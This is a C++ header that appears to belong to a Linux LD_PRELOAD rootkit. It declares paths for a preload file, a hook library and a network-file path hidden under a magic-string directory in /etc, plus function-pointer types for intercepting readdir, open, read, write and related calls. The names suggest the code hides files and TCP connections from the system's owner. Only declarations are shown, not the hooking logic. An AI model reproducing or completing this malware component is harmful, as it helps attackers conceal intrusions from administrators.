
#ifndef MAIN_HEADER_HPP
#define MAIN_HEADER_HPP

//#define NDEBUG

//
// Headers
//
#include <string>
#include <memory>
#include <sstream>
#include <new>
#include <list>

#include <cstdio>
#include <cerrno>
#include <cstring>
#include <cassert>
#include <cstdlib>

#include <unistd.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

//
// Defines and const strings
//
#ifndef NDEBUG
	#define MAGIC_STRING "0x1234DEADBEAF4321"
#endif
extern const char *prelFileName;
extern const char *prelFileNameClear;
extern const char *linuxConfigPath;
extern const char *envShowName;
extern const char *envShowValue;
extern const char *dynCnfFileClear;
#define dynCnfFile ("/etc/" + std::string (MAGIC_STRING) + std::string ("/") + dynCnfFileClear)
extern char created, not_created, writed, not_writed, separator;
extern const char *hookLibraryNameClear;
#define hookLibraryName ("/etc/" + std::string (MAGIC_STRING) + std::string ("/") + hookLibraryNameClear)
extern const char *tcp4Path;
extern const char *tmpNtwFileNameClear;
#define tmpNtwFileName ("/etc/" + std::string (MAGIC_STRING) + std::string ("/") + tmpNtwFileNameClear)
extern const int nameSize;

//
// Prototypes of functions, constants and POD
//
extern "C" void finitFunc ();
extern "C" void initFunc ();


typedef dirent* (*RDDR) (DIR *dirp);
typedef int (*RDDR_R) (DIR *dirp, struct dirent *entry, struct dirent **result);
typedef int (*OPEN)(const char *pathname, int flags, mode_t mode);
typedef int (*CREAT)(const char *pathname, mode_t mode);
typedef int (*OPENAT)(int dirfd, const char *pathname, int flags, mode_t mode);
typedef int (*ACCESS)(const char *pathname, int mode);
typedef ssize_t (*READ)(int fd, void *buf, size_t count);
typedef ssize_t (*WRITE)(int fd, void *buf, size_t count);
typedef ssize_t (*PREAD)(int fd, void *buf, size_t count, off_t offset);
typedef ssize_t (*PWRITE)(int fd, const void *buf, size_t count, off_t offset);
typedef off_t (*LSEEK)(int fd, off_t offset, int whence);


std::string intToString (int var);
std::string readLinkName (const std::string & name);
bool haveTcp4Relation (int fd);
std::string getCwdEasy ();
std::string getClearName (const std::string & str);
int lockAllFile (int fd);

class CErrnoSaver {
	int m_errno;
public:
	CErrnoSaver (): m_errno (errno) {}
	~CErrnoSaver () {errno = m_errno;}
	
	void set (int err) {m_errno = errno;}
	int get () const {return m_errno;}
};

class DescrDeleter {
public:
	void operator () (int *p) {
		if (*p >= 0) close (*p);
		delete p;
	}
};

typedef std::unique_ptr <int, DescrDeleter> descr_holder;


#endif // MAIN_HEADER_HPP
